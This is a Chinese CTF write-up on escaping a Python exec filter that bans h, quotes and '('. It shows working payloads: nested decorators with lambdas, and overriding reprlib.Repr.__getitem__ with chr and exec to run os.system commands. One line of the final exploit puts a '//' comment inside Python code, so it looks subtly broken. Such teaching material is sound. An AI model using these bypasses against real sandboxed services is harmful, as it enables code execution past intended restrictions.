# python受限的任意代码执行与黑魔法
## 起因
在NCTF/NJUPTCTF 2021中有一道misc题: 
```python
我们可爱的Hex酱又有了一个强大的功能，可以去执行多行语句惹~
但是为了防止有些居心叵测的人，我们专门把括号，单双引号，都过滤掉，噢对不准色色，所以也不准出现h哟~

Ubuntu Python3.6.9

快去找Hex酱(QQ:2821876761)私聊吧
附件：

https://nctf.slight-wind.com/misc/hex/runner.py
https://attachment.h4ck.fun:9000/misc/hex/runner.py
```

其中附件内容如下:
```python
import sys
from base64 import b64decode

code = sys.argv[1]

try:
    data = b64decode(code.encode()).decode()
except:
    exit(0)

for c in 'h"\'(':
    if c in data: exit(0)

exec(data)
```

这其实就是一个受限制的python代码执行，不能使用h，单引号，双引号，左括号字符。我们知道在SSTI中我们如果禁用了小括号的话是没办法任意命令执行的，但是在任意python代码执行的情况下还有转机吗？

## 正解: 装饰器
正解不是本篇文章主要讨论的内容，这里也介绍一下，其实就是python装饰器的技巧，一个简单的python装饰器如下:
```python
def log(func):
    def wrapper(*args, **kw):
        print("here is a log")
        func()
    return wrapper


@log
def func():
    print("hello world")


func()
```
这里的`@log`实际上是一个语法糖，他等价于`func=log(func)`，也就是说这里隐式包含了函数调用，同时**装饰器是可以嵌套的**，并且能够用于**装饰类**。

但是这里我们依然用到了小括号，我们怎样才能避免这个情况呢？实际上是用到了python的(残废)匿名函数，一个简单的python匿名函数如下:

```python
func = lambda _: "system" # 意思是无论传入什么参数最终都会返回system这个字符串
print(func("anything")) # system
```

所以我们可以使用嵌套的装饰器去调用`os.system()`, 例如:
```python
from os import system
c = lambda _: "whoami"

@system
@c
class x:pass
```
实际上调用的是`system(c(x))`，而c函数不管传入什么都会返回"whoami"这个字符串，最终实现命令执行

这里还有最后一个问题是如何构造字符串，因为我们是没办法使用单引号或者双引号的，所以我们需要利用一些python原生的字符串，比如某些类的`__doc__`,比如字典(dict)的doc如下:
```text
dict() -> new empty dictionary
dict(mapping) -> new dictionary initialized from a mapping object's
    (key, value) pairs
dict(iterable) -> new dictionary initialized as if via:
    d = {}
    for k, v in iterable:
        d[k] = v
dict(**kwargs) -> new dictionary initialized with the name=value pairs
    in the keyword argument list.  For example:  dict(one=1, two=2)
```
这里面基本上存在我们需要的英文字符，可以使用`{}.__doc__[index]`的形式获取字符串，所以最终的exp可以是:
```python
from os import system
n = {}.__doc__
f = lambda _: n[2]+n[80]+n[55]+n[6]+n[75]+n[69]+n[80]+n[88]  # cat flag
@system
@f
class x:pass
```

## 寻找非预期
如果我们不使用装饰器的方法，这道题目还有做法吗？换句话说假如我们不允许代码中存在@这个字符，这道题还能够解吗？答案是肯定的。

所以我们的题目变成:
```python
import sys
from base64 import b64decode

code = sys.argv[1]

try:
    data = b64decode(code.encode()).decode()
except:
    exit(0)

for c in 'h@"\'(':
    if c in data: exit(0)

exec(data)
```

这里我们重新思考一下，我们在没有小括号使用的情况下，还有什么能够使用呢？答案是中括号，我们知道，如果我们尝试使用中括号根据索引去获取对象时，实际上是调用了类中的`__getitem__`方法，一个简单的示例如下:
```python
class C:
    def __getitem__(self, key):
        return str(key) + "111"

c = C()
print(c["qwe"])  # qwe111
```
可以看到这里的`__getitem__`魔术方法是一个特殊的方法，当我们调用`c["anything"]`的是时候实际上调用了`c.__getitem__("qwe")`，这样我们即使没有小括号也能够进行函数调用。如果我们可以覆盖某些类的`__getitem__`方法为一些自带方法的话，我们就可以实现命令执行了。

### 失败的尝试: 覆盖自带类的__getitem__
我的第一个想法是覆盖python自带类的`__getitem__`方法，例如list或者dict，但是经过测试之后发现这是行不通的:
![](https://gitee.com/guuest/images/raw/master/img/20220104104649.png)

所以我们的目的就是要找到一个类能够覆盖其`__getitem__`并且能获取到这个**类的实例**，这里的重点是获取到类的实例，因为我们就算可以定义一个自定义的类，也无法获取这个类的实例，因为**获取类的实例也需要小括号**

### 成功的尝试: python标准库里的魔术
我们尝试从python标准库中找到一个符合我们标准的库，python的标准库参考[这里](https://docs.python.org/zh-cn/3/library/index.html)

在一番寻找后，我们将目光投向`reprlib`这个库，它完美符合了我们的要求!
![](https://gitee.com/guuest/images/raw/master/img/20220104110102.png)
一个简单的示例如下:
```python
import reprlib
reprlib.Repr.__getitem__=exec
a=reprlib.aRepr
a["print('whoami')"]
```

所以我们最终的exp构造大致如下:
1. 从标准库中引入reprlib这个库
2. 覆盖`reprlib.Repr`的`__getitem__`方法为chr方法
3. 通过`reprlib.aRepr`中括号调用构造任意字符串
4. 再次覆盖为`exec`方法
5. 真正意义上的python代码执行

这里需要注意的是由于h也被禁用了，所以我们没有办法直接`reprlib.Repr.__getitem__=chr`，需要走一下弯路，利用builtins库的`__dict__`再利用字典的`__doc__`，我们最终得到一个非常酷的exp如下:
```python
data = """
import reprlib
import builtins
__=reprlib.aRepr
reprlib.Repr.__getitem__ = builtins.__dict__[{}.__doc__[2]+{}.__doc__[280]+{}.__doc__[28]]  # chr
exp=__[95]+__[95]+__[105]+__[109]+__[112]+__[111]+__[114]+__[116]+__[95]+__[95]+__[40]+__[39]+__[111]+__[115]+__[39]+__[41]+__[46]+__[115]+__[121]+__[115]+__[116]+__[101]+__[109]+__[40]+__[39]+__[119]+__[104]+__[111]+__[97]+__[109]+__[105]+__[39]+__[41] // __import__('os').system('whoami')
reprlib.Repr.__getitem__ = exec
reprlib.aRepr[exp]
"""

for c in 'h@"\'(':
    if c in data:
        print(c)
        exit(0)

exec(data)
```